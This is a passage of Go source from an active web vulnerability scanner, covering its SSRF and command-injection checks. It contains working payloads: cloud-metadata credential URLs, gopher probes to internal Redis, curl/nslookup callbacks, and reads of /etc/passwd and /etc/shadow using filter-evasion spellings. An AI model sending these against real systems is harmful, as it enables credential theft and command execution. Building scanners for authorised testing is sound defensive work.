package active

import (
	"context"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// ssrfSeeds are the URL shapes a server-side fetch might accept. The callback
// address is substituted per attempt, so one seed covers a whole family of
// destinations.
var ssrfSeeds = []string{
	checks.CallbackURL,
	"http://" + checks.CallbackURL + "/",
	"https://" + checks.CallbackURL + "/",
	"//" + checks.CallbackURL + "/",
	checks.CallbackURL + "@example.com",
	"http://example.com@" + checks.CallbackURL + "/",
	"http://" + checks.CallbackURL + "/?url=" + checks.CallbackURL,
	// The same address, written as one number. A filter that blocks the dotted form has
	// blocked a spelling, not the address: one of these reaches the same callback.
	"http://" + checks.CallbackHostDecimal + "/?url=" + checks.CallbackURL,
	"http://" + checks.CallbackHostHex + "/?url=" + checks.CallbackURL,
	"http://" + checks.CallbackHostOctal + "/?url=" + checks.CallbackURL,
	"http://" + checks.CallbackHostShort + "/?url=" + checks.CallbackURL,
	"http://" + checks.CallbackHostMapped + "/?url=" + checks.CallbackURL,
	"dict://" + checks.CallbackURL + "/",
	"gopher://" + checks.CallbackURL + "/_",
	"ftp://" + checks.CallbackURL + "/",
}

// ssrf detects server-side request forgery by asking the target to fetch an
// address only crackweb's own listener can answer.
//
// This is the only way to find a blind SSRF: the response to the triggering
// request says nothing, and the proof arrives later, on a different connection.
// The variety in the seed list matters more than mutation here — a filter is far
// more likely to be missing a URL scheme than a character.
type ssrf struct{}

func (ssrf) ID() string                 { return "ssrf" }
func (ssrf) TitleKey() i18n.Key         { return i18n.KeyCheckSSRFTitle }
func (ssrf) DescriptionKey() i18n.Key   { return i18n.KeyCheckSSRFDesc }
func (ssrf) RemediationKey() i18n.Key   { return i18n.KeyCheckSSRFFix }
func (ssrf) Severity() finding.Severity { return finding.SeverityHigh }
func (ssrf) Tags() []string {
	return []string{"active", "injection", "ssrf", "owasp-top10"}
}
func (ssrf) Passive() bool { return false }

// ssrfMetadataSeeds are the addresses a cloud instance's metadata service answers
// on. They are link-local or provider-internal, reachable only from inside the
// instance itself — which is exactly why an application that fetches one on a
// caller's behalf is the finding.
var ssrfMetadataSeeds = []string{
	"http://169.254.169.254/latest/meta-data/",
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
	"http://169.254.169.254/latest/user-data/",
	"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
	"http://metadata.google.internal/computeMetadata/v1/instance/",
	"http://100.100.100.200/latest/meta-data/",
}

// ssrfMetadataSignatures are strings the metadata service returns and an ordinary
// page does not. The list is lower case because the comparison lower-cases the
// body, and it names fields rather than values: a directory listing is enough to
// prove the service was reached.
var ssrfMetadataSignatures = []string{
	"ami-id",
	"ami-launch-index",
	"ami-manifest-path",
	"instance-id",
	"instance-type",
	"local-hostname",
	"reservation-id",
	"security-groups",
	"security-credentials",
	"secretaccesskey",
	"computemetadata",
}

// ssrfMetadata reports a target that fetched a cloud instance's metadata service
// on the caller's behalf.
//
// The response is the whole proof: the service is reachable only from inside the
// instance, and what it hands back — the instance id, its role, and on most
// providers the credentials that go with them — is a string a page has no other
// reason to contain. Nothing here needs a listener of ours, which is why it is
// tried before the callback form.
func ssrfMetadata(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	baseline := strings.ToLower(string(t.Response.Body))
	for _, seed := range ssrfMetadataSeeds {
		mutated, response, err := c.Inject(ctx, t, seed)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		body := strings.ToLower(stripPayloadEcho(string(response.Body), seed))
		for _, signature := range ssrfMetadataSignatures {
			// A field name the address itself spells is not evidence of a fetch.
			// `computeMetadata` is inside the Google seed, so a page that prints
			// the address it was given — in full, or cut short, or split across
			// markup — prints this too, and a suggestion API that echoes its query
			// would be recorded as a cloud instance that answered. Removing the
			// echo already covers the faithful case; this covers the rest, because
			// what these signatures name is a field of the instance, and a field
			// of the instance is something only a fetch can produce.
			if strings.Contains(strings.ToLower(seed), signature) {
				continue
			}
			if !strings.Contains(body, signature) || strings.Contains(baseline, signature) {
				continue
			}
			f := checks.NewFinding(ssrf{}, t,
				i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
			// Critical rather than high: on AWS, GCP and Aliyun the same service
			// hands out the instance's role credentials.
			f.Severity = finding.SeverityCritical
			f.Confidence = finding.ConfidenceCertain
			f.Payload = seed
			f.CWE = "CWE-918"
			f.References = []string{
				"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
				"https://cwe.mitre.org/data/definitions/918.html",
			}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				"the response carries cloud instance metadata: " + signature,
				"the address is reachable only from inside an instance, not from a browser",
			}
			f.Evidence.Diff = extractAround(string(response.Body), signature, 240)
			return f
		}
	}
	return nil
}

// ssrfInternalSeeds are requests to services reachable only from inside the target's
// own network.
//
// This is the step after proving that a URL is fetched at all: a plain
// `http://127.0.0.1:<port>` probe can say a port answers, but `gopher://` lets the
// payload *speak* the protocol, so what comes back is the service's own reply rather
// than a guess made from response times and error pages. Redis and Memcached answer in
// text, which is what makes the reply conclusive; the same trick against a binary
// protocol would need a fingerprint this check cannot honestly claim.
var ssrfInternalSeeds = []struct {
	payload   string
	signature string
	service   string
}{
	{"gopher://127.0.0.1:6379/_PING%0D%0A", "+PONG", "Redis"},
	{"gopher://127.0.0.1:11211/_stats%0D%0A", "STAT pid", "Memcached"},

	// Services that speak HTTP on a port nothing outside should reach. They are asked with
	// an ordinary URL rather than a protocol request, because that is all they need — and
	// the answer names itself, which is what makes the reply conclusive. An exposed Docker
	// daemon is the one worth the most: an unauthorised API on that socket is a container
	// this scanner could ask for.
	// The signatures are the field names without their quotes. An application that echoes
	// what it fetched usually escapes it first — `&quot;ApiVersion&quot;` is the same
	// answer as `"ApiVersion"`, and a signature carrying the quotes would miss it.
	{"http://127.0.0.1:2375/version", "apiversion", "Docker API"},
	{"http://127.0.0.1:2379/version", "etcdserver", "etcd"},
	{"http://127.0.0.1:8080/version", "gitversion", "Kubernetes API server"},
}

// ssrfInternal reports a target that carried a protocol request to an internal service
// and handed back that service's answer.
//
// The signature is what makes it conclusive: `+PONG` is Redis answering, not a page that
// happens to contain the string — and the baseline is checked so that a page which
// mentions it for its own reasons cannot be mistaken for one.
func ssrfInternal(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	baseline := strings.ToLower(string(t.Response.Body))
	for _, seed := range ssrfInternalSeeds {
		mutated, response, err := c.Inject(ctx, t, seed.payload)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		body := strings.ToLower(stripPayloadEcho(string(response.Body), seed.payload))
		signature := strings.ToLower(seed.signature)
		if !strings.Contains(body, signature) || strings.Contains(baseline, signature) {
			continue
		}

		f := checks.NewFinding(ssrf{}, t,
			i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
		f.Severity = finding.SeverityCritical
		f.Confidence = finding.ConfidenceCertain
		f.Payload = seed.payload
		f.CWE = "CWE-918"
		f.References = []string{
			"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
			"https://cwe.mitre.org/data/definitions/918.html",
		}
		f.Evidence.Request = mutated.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
		f.Evidence.Baseline = truncate(t.Response.Body, 4096)
		f.Evidence.Matches = []string{
			"an internal " + seed.service + " answered the request the payload built (" +
				seed.signature + ")",
			"the service listens on loopback only, so the answer proves the target fetched it " +
				"from inside its own network",
		}
		f.Evidence.Diff = extractAround(string(response.Body), seed.signature, 200)
		return f
	}
	return nil
}

func (ssrf) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	c.ProbeWAF(ctx, t)

	// The metadata service first: no listener of ours is involved, and what it
	// gives back is both easier to recognise and worse to leak than a callback.
	if f := ssrfMetadata(ctx, c, t); f != nil {
		return []*finding.Finding{f}
	}
	// A fetcher that takes a URL takes the file scheme too, unless it was told not to. Asking
	// for a file the server can read is the same mistake as asking for a service it can reach,
	// and the answer comes back in the response rather than needing a listener.
	if f := ssrfFileRead(ctx, c, t); f != nil {
		return []*finding.Finding{f}
	}
	// Then the services that are only reachable from inside. A protocol request that
	// comes back with the service's own answer needs no listener of ours either.
	if f := ssrfInternal(ctx, c, t); f != nil {
		return []*finding.Finding{f}
	}
	if c.OOB == nil {
		return nil
	}

	// DNS rebinding first: it is the one form that survives a private-address
	// check, and it judges on a connection only the rebound answer could produce.
	// Sending it before the plain callback probe lets a target that also happens
	// to resolve our name be reported for the sharper reason when both apply.
	if f := ssrfRebind(ctx, c, t); f != nil {
		return []*finding.Finding{f}
	}

	attempt, err := c.ProbeOOB(ctx, t, "ssrf", ssrfSeeds, 0)
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(ssrf{}, t,
		i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-918"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
		"https://cwe.mitre.org/data/definitions/918.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Raw(), 4096)
	f.Evidence.Matches = []string{describeInteraction(c, attempt)}
	return []*finding.Finding{f}
}

// rebindServer is the optional capability a DNS-rebinding probe needs: an
// out-of-band server that can answer a name with an address that changes between
// lookups. The listener crackweb runs itself implements it; a third-party
// interactsh deployment does not, and neither does a self-hosted server with no
// delegated domain — in both cases NewRebindURL returns empty strings and the
// probe skips rather than shipping requests whose lookups nothing would answer.
type rebindServer interface {
	NewRebindURL(label string) (callbackURL, token string)
}

// ssrfRebindForms are the URL shapes a rebinding name is planted in. The
// placeholder is the minted authority; the absolute and protocol-relative forms
// cover a parameter that wants a scheme and one whose caller supplies its own.
var ssrfRebindForms = []string{
	"http://{rebind}/",
	"//{rebind}/",
}

// rebindPollInterval is how often the rebinding probe checks for a callback
// while it waits, matching the plain out-of-band probe's cadence.
const rebindPollInterval = 250 * time.Millisecond

// ssrfRebind detects SSRF that survives a private-address check by changing what
// a hostname resolves to between the validation a target performs and the fetch
// it makes.
//
// The evidence is a connection, and it has to be. The name answers with a public
// documentation address first and a loopback/private one on every later lookup.
// A target that resolves once and fetches follows the public answer, which
// reaches nothing of ours, so no callback arrives. Only a target that resolves a
// second time — the double lookup a rebinding attack depends on — receives the
// private answer, and only then can a fetch reach our listener and show up here.
// A target that resolves again but re-validates the second answer and refuses it
// also produces no callback, so a finding is a connection that could only have
// come from the rebound address being used, not a bare second lookup.
//
// This is why the probe is stricter than the plain callback probe and runs
// alongside it rather than replacing it: an ordinary SSRF that follows a single
// answer is still caught by the seeds in ssrfSeeds, and this adds the target that
// only yields once the address changes underneath it.
func ssrfRebind(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	rebind, ok := c.OOB.(rebindServer)
	if !ok {
		return nil
	}

	type rebindAttempt struct {
		token string
		sent  *checks.Attempt
	}
	var pending []rebindAttempt

	for _, form := range ssrfRebindForms {
		callbackURL, token := rebind.NewRebindURL("ssrf-rebind")
		if callbackURL == "" || token == "" {
			// The server cannot express a rebinding name (no delegated domain),
			// so every form would test nothing.
			return nil
		}
		// The minted URL carries the port a rebound connection should reach; the
		// scheme is dropped so the authority can be reused under each form.
		authority := strings.TrimSuffix(strings.TrimPrefix(callbackURL, "http://"), "/")
		seed := strings.ReplaceAll(form, "{rebind}", authority)

		request, response, err := c.Inject(ctx, t, seed)
		if err != nil || request == nil || response == nil {
			continue
		}
		if c.WAF.IsBlocked(t.Request.Hostname(), response) {
			continue
		}
		pending = append(pending, rebindAttempt{
			token: token,
			sent: &checks.Attempt{
				Request:  request,
				Response: response,
				Variant:  payload.Variant{Value: seed},
			},
		})
	}
	if len(pending) == 0 {
		return nil
	}

	wait := c.OOBWait
	if wait <= 0 {
		wait = checks.OOBWait
	}
	deadline := time.Now().Add(wait)
	for {
		for i := range pending {
			for _, interaction := range c.OOB.Poll(pending[i].token) {
				// Only an HTTP callback proves the rebound address was fetched: a
				// DNS lookup alone says the target re-resolved, which a target
				// that then refuses the private answer also does.
				if interaction.Protocol != "http" {
					continue
				}
				pending[i].sent.Interactions = []checks.Interaction{interaction}
				return rebindFinding(t, pending[i].sent, interaction)
			}
		}
		if time.Now().After(deadline) {
			return nil
		}
		select {
		case <-time.After(rebindPollInterval):
		case <-ctx.Done():
			return nil
		}
	}
}

// rebindFinding renders the finding for a rebinding name whose rebound address
// was fetched. The seed carries the name, so the evidence names what was planted
// and what connected back.
func rebindFinding(t *checks.Target, attempt *checks.Attempt, interaction checks.Interaction) *finding.Finding {
	f := checks.NewFinding(ssrf{}, t,
		i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-918"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
		"https://cwe.mitre.org/data/definitions/918.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Raw(), 4096)
	f.Evidence.Matches = []string{
		"the name in " + attempt.Variant.Value + " first resolved to a public address and then to a " +
			"loopback/private one; the target fetched the rebound address and connected back (" +
			interaction.Protocol + " from " + interaction.RemoteAddr + ")",
		"an address that changes between the check and the fetch is DNS rebinding: the first " +
			"answer passes a private-address filter, the second reaches an internal address",
	}
	return f
}

// commandInjectionSeeds ask the target to resolve or fetch the callback address.
// Both are used because a target may be able to resolve names without being able
// to make outbound HTTP requests, or the other way round.
var commandInjectionSeeds = []string{
	"; nslookup " + checks.CallbackHost,
	"| nslookup " + checks.CallbackHost,
	"& nslookup " + checks.CallbackHost,
	"`nslookup " + checks.CallbackHost + "`",
	"$(nslookup " + checks.CallbackHost + ")",
	"; host " + checks.CallbackHost,
	"; ping -c 1 " + checks.CallbackHost,
	"; curl " + checks.CallbackURL,
	"| curl " + checks.CallbackURL,
	"& curl " + checks.CallbackURL,
	"`curl " + checks.CallbackURL + "`",
	"$(curl " + checks.CallbackURL + ")",
	"; wget -qO- " + checks.CallbackURL,
	"%0anslookup " + checks.CallbackHost,
	"'; nslookup " + checks.CallbackHost + " #",
	// The braced spelling of IFS. A filter that strips the `$IFS` the mutation
	// engine produces has not seen `${IFS}`, and the shell reads both the same.
	";${IFS}nslookup " + checks.CallbackHost,
	// A newline where the seeds above put `;`, `|` or `&`, and `${IFS}` where they put a
	// space: a filter that matches the separators and the space it knows about lets these
	// through, and the shell runs what follows all the same.
	"\nnslookup " + checks.CallbackHost,
	"\nnslookup${IFS}" + checks.CallbackHost,
	"\ncurl " + checks.CallbackURL,
	"\ncurl${IFS}" + checks.CallbackURL,
	"\nping " + checks.CallbackHost,
}

// commandInjectionTimeSeeds make the shell sleep. They are the fallback for a
// target that cannot reach the internet at all.
var commandInjectionTimeSeeds = []string{
	"; sleep 3",
	"| sleep 3",
	"& sleep 3",
	"$(sleep 3)",
	"`sleep 3`",
	"%0asleep 3",
	"; ping -c 4 127.0.0.1",
	// The same pause, separated by a newline and spaced by IFS rather than by a space, for a
	// filter that rejects the separators it knows and the space it expects a command line to
	// need. Both were measured: each of them made the target wait three seconds while the
	// seeds above did not.
	"\nsleep 3",
	"\nsleep${IFS}3",
}

// commandInjectionSleep is the pause the time-based seeds request; a response
// has to be at least this much slower than the baseline to count.
const commandInjectionSleep = 3 * time.Second

// commandInjection detects operating-system command injection, by callback where
// an out-of-band server is available and by timing where it is not.
type commandInjection struct{}

func (commandInjection) ID() string                 { return "command-injection" }
func (commandInjection) TitleKey() i18n.Key         { return i18n.KeyCheckCMDiTitle }
func (commandInjection) DescriptionKey() i18n.Key   { return i18n.KeyCheckCMDiDesc }
func (commandInjection) RemediationKey() i18n.Key   { return i18n.KeyCheckCMDiFix }
func (commandInjection) Severity() finding.Severity { return finding.SeverityCritical }
func (commandInjection) Tags() []string {
	return []string{"active", "injection", "rce", "owasp-top10"}
}
func (commandInjection) Passive() bool { return false }

// commandOutputSeeds ask the target to read a file and print it. The output is
// the proof: a page that hands back the contents of `/etc/passwd` has run the
// command, and no listener of our own is needed to know it.
//
// The spellings are mixed on purpose. `${IFS}` hides the space and `?` hides a
// character of the path, and each defeats a different filter — a rule written
// against the literal `cat /etc/passwd` sees neither `cat${IFS}/etc/pass?d` nor
// the substring it was written to match. Combining both in one payload is what
// reaches a target that has learned to block either one alone.
var commandOutputSeeds = []string{
	"; cat /etc/passwd",
	"; cat${IFS}/etc/pass?d",
	"; cat${IFS}/etc/pass*",
	";cat${IFS}/etc/pass?d",
	"| cat /etc/passwd",
	"& cat /etc/passwd",
	"$(cat /etc/passwd)",
	"`cat /etc/passwd`",
	"; cat /etc/hosts",
	"; cat${IFS}/etc/host?",
	"; cat /etc/shadow",
	"; id",
	"| id",
	"& id",
	"; uname -a",
	"| type C:\\windows\\win.ini",
	"; type C:\\windows\\win.in?",
	"& type C:\\boot.ini",
	// Spelling tricks for the reading part of the command, each measured on a
	// local target: `<` redirects a file into a command without a space, `$@`
	// expands to nothing outside a function, and piping through `base64` puts the
	// file's contents on the wire in a form a filter looking for `root:` is not
	// written for.
	"; cat</etc/passwd",
	";cat</etc/passwd",
	"; cat /etc/passw$@d",
	"; cat /etc/passwd|base64",
	";cat /etc/passwd|base64",
	// The command name itself split apart. A filter that matches the words it knows —
	// `cat`, `whoami`, `id` — is the shape this defeats, and those words are the ones such
	// a filter is written for. Each of these was measured on a local shell; `${IFS}` is
	// absent on purpose, since where it expands to whitespace it does so in the middle of a
	// word as readily as between two, and it did not hold up here.
	"; c$@at /etc/passwd",
	"; c''at /etc/passwd",
	`; c"at" /etc/passwd`,
	"; c\\at /etc/passwd",
	"; cat$@ /etc/passwd",
	"; /bin/c$@at /etc/passwd",
	// The newline as the separator. A filter written against the separators it knows — `;`,
	// `|`, `&` — and against the space often misses this one, and the shell reads it the
	// same. Measured on a target that rejects all three and a literal space, and runs these:
	// the value it was given is decoded before it reaches the shell, so a newline arrives as
	// a newline and the command after it runs.
	"\ncat /etc/passwd",
	"\ncat${IFS}/etc/pass?d",
	"\ncat</etc/passwd",
	"\ncat /etc/hosts",
	"\nid",
}

// commandOutputSignatures are lines those commands produce and an ordinary page
// does not. They are looked for in the response after the payload itself has been
// removed, so a page that echoes the request — the usual way a check like this
// fools itself — cannot supply them.
//
// They are lower case because the comparison lower-cases the body: a signature
// with a capital in it would never match anything.
var commandOutputSignatures = []string{
	// `base64` of `root:x:0:`, for the payload that encodes the output; compared
	// lower-cased, like every other signature here.
	// Encoded output is not listed here either: a target that prints what it read through base64
	// or hex is decoded and compared as text, so the evidence quotes the file's own line.
	"root:x:0:0",
	"daemon:x:1:1",
	"nobody:x:65534",
	"www-data:x:",
	"uid=0(",
	"gid=0(",
	"[boot loader]",
	"for 16-bit app support",
	"[fonts]",
	"localhost ip6-localhost",
	"gnu/linux",
}

// commandInjectionOutput reports a command whose output came back in the page.
//
// This is the strongest form the check can reach: the target did not merely try
// to resolve a name, it handed back what a command printed — already used as a
// read primitive. Nothing about it needs an out-of-band listener or a stopwatch,
// which is why it is tried first and why a hit is Critical rather than High.
// commandInjectionPath runs the output seeds through the path instead of a parameter.
//
// A route that hands the name it was addressed by to a shell — a ping tool, a converter, a
// report named in the URL — is the same mistake written in a different place, and the evidence
// is the same: the file the command was asked to read comes back. No parameter check reaches it,
// and the seed is appended to the segment that is already there because the route expects a
// value in that position.
//
// Reached before the out-of-band and timing probes, because it is the cheapest of the three and
// the strongest when it answers: a file's own contents, in the response, in one request.
func commandInjectionPath(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	limit := commandPathSeeds
	if limit > len(commandOutputSeeds) {
		limit = len(commandOutputSeeds)
	}
	baseline := strings.ToLower(string(t.Response.Body))
	segment := pathSegment(t.Request)

	for _, seed := range commandOutputSeeds[:limit] {
		payloadText := seed
		if segment != "" {
			payloadText = segment + seed
		}
		for _, inPlace := range []bool{true, false} {
			request, ok := withPathPayload(t.Request, payloadText, inPlace)
			if !ok {
				continue
			}
			response, err := c.Do(ctx, request)
			if err != nil || response == nil || response.Status >= 400 {
				continue
			}
			withoutEcho := stripPayloadEcho(string(response.Body), payloadText)
			for _, view := range decodedViews([]byte(withoutEcho)) {
				body := strings.ToLower(view)
				signature := ""
				for _, candidate := range commandOutputSignatures {
					if strings.Contains(body, candidate) && !strings.Contains(baseline, candidate) {
						signature = candidate
						break
					}
				}
				if signature == "" {
					continue
				}
				quoted := signature
				if len(view) != len(withoutEcho) {
					quoted += " (the page printed what it read through an encoding)"
				}
				where := "appended to the path"
				if inPlace {
					where = "in place of the last path segment"
				}

				f := checks.NewFinding(commandInjection{}, t,
					i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
				f.Severity = finding.SeverityCritical
				f.Confidence = finding.ConfidenceCertain
				f.Payload = payloadText + " (" + where + ")"
				f.CWE = "CWE-78"
				f.References = []string{"https://cwe.mitre.org/data/definitions/78.html"}
				f.Evidence.Request = request.Raw()
				f.Evidence.Response = truncate(response.Body, 8192)
				f.Evidence.Baseline = truncate(t.Response.Body, 4096)
				f.Evidence.Matches = []string{
					"the response carries the output of the command: " + quoted,
					"the payload was written into the path, with no parameter changed",
					"the route passes the value it was addressed by to a shell",
				}
				f.Evidence.Diff = extractAround(view, signature, 240)
				return []*finding.Finding{f}
			}
		}
	}
	return nil
}

// commandPathSeeds bounds how many seeds are tried through the path: each costs two requests,
// and the first few cover the separators a shell accepts.
const commandPathSeeds = 6

func commandInjectionOutput(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	baseline := strings.ToLower(string(t.Response.Body))
	for _, seed := range commandOutputSeeds {
		mutated, response, err := c.Inject(ctx, t, seed)
		if err != nil || response == nil || response.Status >= 400 {
			continue
		}
		withoutEcho := stripPayloadEcho(string(response.Body), seed)
		// A command's output can come back through an encoding, in which case the signature is
		// present but not in the clear.
		for _, view := range decodedViews([]byte(withoutEcho)) {
			body := strings.ToLower(view)
			var signature string
			for _, candidate := range commandOutputSignatures {
				if strings.Contains(body, candidate) && !strings.Contains(baseline, candidate) {
					signature = candidate
					break
				}
			}
			if signature == "" {
				continue
			}
			quoted := signature
			if len(view) != len(withoutEcho) {
				// Named for a reader: the line they can check by eye lives in the decoded form.
				quoted += " (the page printed what it read through an encoding)"
			}
			f := checks.NewFinding(commandInjection{}, t,
				i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
			f.Severity = finding.SeverityCritical
			f.Confidence = finding.ConfidenceCertain
			f.Payload = seed
			f.CWE = "CWE-78"
			f.References = []string{"https://cwe.mitre.org/data/definitions/78.html"}
			f.Evidence.Request = mutated.Raw()
			f.Evidence.Response = truncate(response.Body, 8192)
			f.Evidence.Baseline = truncate(t.Response.Body, 4096)
			f.Evidence.Matches = []string{
				"the response carries the output of the command: " + quoted,
				"the payload was sent as written, with no mutation",
			}
			f.Evidence.Diff = extractAround(view, signature, 240)
			return []*finding.Finding{f}
		}
	}
	return nil
}

func (commandInjection) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	c.ProbeWAF(ctx, t)

	// The command's own output first: one request per seed, no listener, and the
	// strongest evidence there is — the target printed a file it was asked to read.
	if findings := commandInjectionOutput(ctx, c, t); len(findings) > 0 {
		return findings
	}
	if findings := commandInjectionPath(ctx, c, t); len(findings) > 0 {
		return findings
	}
	if c.OOB != nil {
		if findings := commandInjectionOOB(ctx, c, t); len(findings) > 0 {
			return findings
		}
	}
	return commandInjectionTiming(ctx, c, t)
}

// commandInjectionOOB asks the target to call back.
func commandInjectionOOB(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	attempt, err := c.ProbeOOB(ctx, t, "command-injection", commandInjectionSeeds, 0)
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(commandInjection{}, t,
		i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
	f.Severity = finding.SeverityCritical
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-78"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Command_Injection",
		"https://cwe.mitre.org/data/definitions/78.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Raw(), 4096)
	f.Evidence.Matches = []string{describeInteraction(c, attempt)}
	return []*finding.Finding{f}
}

// commandInjectionTiming measures a pause, which works even when the target
// cannot reach the internet.
//
// It runs through the mutation engine, because a quote, a semicolon and the word
// sleep is about as recognisable as an attack gets — a filter that lets the
// plain payload through would not be doing its job. And like the SQL case, the
// verdict comes from repeated measurement rather than one stopwatch reading.
func commandInjectionTiming(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	// Every spelling in one walk. Sent one at a time, each spelling paid for the engine's whole
	// escalation — its own first generation, then the mutations of it — before the next was
	// tried, so a target that never runs the command cost a walk per spelling. Together, the
	// first generation of all of them goes out before any mutation, which is both the order that
	// finds a working spelling soonest and the one that stops once it does.
	attempt, err := c.SendVariants(ctx, t, payload.Command, "command-injection-time",
		commandInjectionTimeSeeds,
		func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
			return resp.Duration >= commandInjectionSleep/4
		})
	if err != nil || attempt == nil {
		return nil
	}

	encoding := checks.EncodingForVariant(attempt.Variant)
	baseline, err := c.MeasureTiming(ctx, t, t.Param.Value, encoding, checks.DefaultTimingSamples)
	if err != nil {
		return nil
	}
	injected, err := c.MeasureTiming(ctx, t, attempt.Variant.Value, encoding, checks.DefaultTimingSamples)
	if err != nil {
		return nil
	}
	verdict := checks.JudgeTiming(baseline, injected, commandInjectionSleep)
	if !verdict.Delayed {
		return nil
	}

	f := checks.NewFinding(commandInjection{}, t,
		i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceFirm
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-78"
	f.References = []string{"https://cwe.mitre.org/data/definitions/78.html"}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Body, 4096)
	f.Evidence.Duration = verdict.Injected.Median
	f.Evidence.Matches = []string{
		c.Bundle.T(i18n.KeyEvidenceTimingStat,
			len(injected.Samples), ms(verdict.Injected.Median), ms(baseline.Median),
			ms(verdict.Injected.IQR), variantNote(c, attempt)),
	}
	return []*finding.Finding{f}
}

// describeInteraction renders the callback that proved an out-of-band finding.
func describeInteraction(c *checks.Context, attempt *checks.Attempt) string {
	if attempt == nil || len(attempt.Interactions) == 0 {
		return c.Bundle.T(i18n.KeyEvidenceOOB, "", "", "")
	}
	first := attempt.Interactions[0]
	return c.Bundle.T(i18n.KeyEvidenceOOB,
		strings.TrimSpace(first.Detail), first.Protocol, first.RemoteAddr)
}

// ssrfFileSeeds ask the server to fetch one of its own files.
//
// A URL fetcher that accepts what it is given accepts `file:` as readily as `http:` — the
// function that fetches a page and the function that opens a path are the same one in most
// runtimes. The spellings cover the filter that blocks the obvious form: naming the host
// explicitly reaches the same handler, and the Windows path covers a target that is not Unix.
var ssrfFileSeeds = []string{
	"file:///etc/passwd",
	"file:///etc/hosts",
	"file://localhost/etc/passwd",
	"file://127.0.0.1/etc/passwd",
	"file:///c:/windows/win.ini",
}

// ssrfFileSignatures are lines only the file itself carries, chosen so that none of them can
// appear in a payload that asks for the file: `localhost` belongs to a hosts file and to the
// name of the file scheme alike, and a page that repeats its input would be reported on it.
var ssrfFileSignatures = []string{
	"root:x:0:0",
	"[fonts]",
	"[extensions]",
	"daemon:x:1:1",
}

// ssrfFileRead reports a fetcher that returned a file it was asked for by name.
//
// The judgement is the file's own contents: a signature that appears as a result of this request
// and was not in the page before, and that the request did not itself carry. Nothing about the
// response being a page is assumed — a fetcher that dumps the file and one that merely reports
// how many bytes it read both answer here, and only the first is evidence.
func ssrfFileRead(ctx context.Context, c *checks.Context, t *checks.Target) *finding.Finding {
	baseline := strings.ToLower(string(t.Response.Body))
	for _, seed := range ssrfFileSeeds {
		request, response, err := c.Inject(ctx, t, seed)
		if err != nil || request == nil || response == nil || response.Status >= 400 {
			continue
		}
		signature := firstNewSignatureNotEchoed(strings.ToLower(string(response.Body)), baseline,
			ssrfFileSignatures, strings.ToLower(seed))
		if signature == "" {
			continue
		}

		f := checks.NewFinding(ssrf{}, t,
			i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
		// Certain: a file the server holds came back because it was asked for by name.
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceCertain
		f.Payload = seed
		f.CWE = "CWE-918"
		f.References = []string{
			"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
			"https://cwe.mitre.org/data/definitions/918.html",
		}
		f.Evidence.Request = request.Raw()
		f.Evidence.Response = truncate(response.Body, 8192)
